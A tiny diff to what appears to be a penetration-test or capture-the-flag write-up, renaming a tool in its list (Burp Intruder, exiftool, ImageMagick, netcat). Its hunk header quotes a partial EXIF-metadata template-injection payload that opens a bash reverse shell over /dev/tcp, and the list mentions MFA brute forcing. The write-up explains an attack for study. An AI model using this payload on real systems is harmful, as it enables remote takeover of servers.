@@ -327,7 +327,7 @@ exiftool -Artist='{{lipsum.__globals__.os.popen("bash -c \"bash -i >& /dev/tcp/1
 
 ## Tools Used
 
-- **Burp Suite Intruder** - MFA brute force with throttling
+- **Burp Intruder** - MFA brute force with throttling
 - **exiftool** - EXIF metadata manipulation
 - **convert** (ImageMagick) - Create minimal PNG files
 - **nc** (netcat) - Reverse shell listener
